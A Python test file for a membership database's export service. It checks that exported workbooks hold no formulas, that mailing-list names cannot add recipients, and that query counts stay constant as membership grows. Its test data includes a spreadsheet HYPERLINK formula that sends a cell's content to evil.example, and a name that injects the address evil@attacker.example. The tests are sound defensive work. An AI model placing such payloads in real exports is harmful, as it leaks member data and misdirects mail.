"""Formula-safe workbook, one-recipient-per-entry mailing list and an export
whose statement count does not grow with the number of members."""

import io
import zipfile
from email.utils import getaddresses
from unittest.mock import MagicMock

import pytest
from openpyxl import load_workbook

from app.models.badge import Badge
from app.models.contact import Contact
from app.models.member import Member
from app.models.member_badge import MemberBadge
from app.models.standesdb_image import StandesdbImage
from app.services import export_service
from tests.standesdb.test_export import _contact, _member, _seed

FORMULA = '=HYPERLINK("http://evil.example/?x="&A2,"Klick")'


class TestWorkbookHasNoFormulas:
    def test_member_and_contact_text_stays_text(self, db_session):
        _seed(db_session)
        member = _member(db_session, vorname="M", nachname="N", arbeitgeber=FORMULA)
        contact = _contact(db_session, name=FORMULA)

        raw = export_service.generate_excel_full(db_session, [member], [contact])

        workbook = load_workbook(io.BytesIO(raw))
        assert workbook["Mitglieder"].cell(row=2, column=33).value == FORMULA
        assert workbook["Mitglieder"].cell(row=2, column=33).data_type == "s"
        assert workbook["Kontakte"].cell(row=2, column=4).value == FORMULA
        assert workbook["Kontakte"].cell(row=2, column=4).data_type == "s"
        with zipfile.ZipFile(io.BytesIO(raw)) as archive:
            sheets = [n for n in archive.namelist() if n.startswith("xl/worksheets/")]
            assert all(b"<f>" not in archive.read(n) for n in sheets)


HOSTILE_NAMES = [
    'Max", <evil@attacker.example>, "Tarn',
    "Back\\slash",
    'Zoë "Zo" Müller',
    'Ends with a quote"',
    "\\",
]


class TestMailingListEntries:
    @pytest.mark.parametrize("first_name", HOSTILE_NAMES)
    def test_a_member_name_stays_one_recipient(self, db_session, first_name):
        _seed(db_session)
        member = _member(
            db_session, vorname=first_name, nachname="N", email="x0@example.at"
        )

        line = export_service.generate_mailing_list([member], []).decode()

        assert [address for _, address in getaddresses([line])] == ["x0@example.at"]

    @pytest.mark.parametrize("name", HOSTILE_NAMES)
    def test_a_contact_name_stays_one_recipient(self, db_session, name):
        _seed(db_session)
        contact = _contact(db_session, name=name, email="c0@example.at")

        line = export_service.generate_mailing_list([], [contact]).decode()

        assert [address for _, address in getaddresses([line])] == ["c0@example.at"]

    def test_quotes_and_backslashes_are_escaped_and_umlauts_stay_readable(
        self, db_session
    ):
        _seed(db_session)
        member = _member(
            db_session, vorname='Zoë "Zo"', nachname="Back\\slash", email="z@example.at"
        )

        line = export_service.generate_mailing_list([member], []).decode()

        assert line == '"Zoë \\"Zo\\" Back\\\\slash" <z@example.at>'

    def test_a_plain_name_is_not_changed(self, db_session):
        _seed(db_session)
        member = _member(
            db_session, vorname="Max", nachname="Muster", email="max@example.at"
        )
        contact = _contact(db_session, name="Kontakt Test", email="k@example.at")

        line = export_service.generate_mailing_list([member], [contact]).decode()

        assert line == '"Max Muster" <max@example.at>, \n"Kontakt Test" <k@example.at>'


EXPORT_FILTER = {
    "vbw_fu": True,
    "vbw_contacts": True,
    "include_disabled_delivery": True,
}


def _add_members_and_contacts(db, count, prefix):
    """Adds `count` members and `count` contacts, each with a badge or an image,
    so that every lazy relation the exports read has something to load."""
    badge = db.query(Badge).filter_by(name="Fuxenband").one()
    members = [
        Member(
            vorname=f"{prefix}{i}",
            nachname="N",
            org_id="vbw",
            state_id="fu",
            zustellungen="adresse_privat",
        )
        for i in range(count)
    ]
    contacts = [
        Contact(
            name=f"{prefix}{i}",
            kontakttyp="person",
            org_id="vbw",
            zustellungen=True,
        )
        for i in range(count)
    ]
    db.add_all(members + contacts)
    db.commit()
    db.add_all(MemberBadge(member_id=m.id, badge_id=badge.id) for m in members)
    db.add_all(
        StandesdbImage(owner_member_id=m.id, sha256_hash=f"{prefix}m{i}", default=True)
        for i, m in enumerate(members)
    )
    db.add_all(
        StandesdbImage(owner_contact_id=c.id, sha256_hash=f"{prefix}c{i}", default=True)
        for i, c in enumerate(contacts)
    )
    db.commit()


class TestExportQueryCount:
    @staticmethod
    def _statements(db, count_queries, run, size, prefix):
        _add_members_and_contacts(db, size, prefix)
        db.expire_all()
        with count_queries() as counter:
            members = export_service.filter_members(db, EXPORT_FILTER)
            contacts = export_service.filter_contacts(db, EXPORT_FILTER)
            run(members, contacts)
        return counter.count, len(members), len(contacts)

    def test_excel_statement_count_does_not_grow_with_members(
        self, db_session, count_queries
    ):
        _seed(db_session)

        def run(members, contacts):
            export_service.generate_excel_full(db_session, members, contacts)

        small, small_members, small_contacts = self._statements(
            db_session, count_queries, run, 3, "A"
        )
        large, large_members, large_contacts = self._statements(
            db_session, count_queries, run, 12, "B"
        )

        assert (small_members, small_contacts) == (3, 3)
        assert (large_members, large_contacts) == (15, 15)
        assert large == small

    def test_booklet_statement_count_does_not_grow_with_members(
        self, db_session, count_queries
    ):
        _seed(db_session)
        storage = MagicMock()
        storage.exists.return_value = False
        admin = Member(vorname="A", nachname="B", org_id="vbw", state_id="fu")

        def run(members, contacts):
            export_service.generate_booklet(
                db_session, members, contacts, admin, storage
            )

        small, small_members, small_contacts = self._statements(
            db_session, count_queries, run, 3, "A"
        )
        large, large_members, large_contacts = self._statements(
            db_session, count_queries, run, 12, "B"
        )

        assert (small_members, small_contacts) == (3, 3)
        assert (large_members, large_contacts) == (15, 15)
        assert large == small
